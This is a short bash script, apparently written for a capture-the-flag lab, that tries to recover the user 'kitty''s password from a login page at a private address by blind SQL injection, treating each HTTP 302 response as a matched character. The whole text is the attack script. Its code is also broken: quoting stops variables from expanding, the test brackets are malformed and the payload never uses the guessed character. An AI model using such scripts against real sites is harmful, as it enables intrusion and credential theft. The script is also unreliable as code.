#!/bin/bash
ip_address=10.10.169.228
url='http://${ip_address}/index.php'
password=''
flag=0
found=0
i=1
while ['$flag' -eq 0]; do
        for char in {a..z} {A..Z} {0..9} '_'
        do
                 found_char=0
                 if ['$password'=='']; then 
                       temp_name='${char}'
                 else  
                       temp_name='${password}${char}'
                 fi
                 payload='username=kitty' and exists (select 1 from information_schema.columns where  table_schema=database() and table_name='siteusers' and column_name='password') 
                 response_code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -d '${payload}' '${url}')
                 if ['$response_code' == '302']; then
                      password='${temp_name}'
                      found_char=1
                      ((i++))
                      break
                 fi
        done
        if ['$found_char' -eq 0]; then
               flag=1
        fi
done
echo "kitty's password : $password"

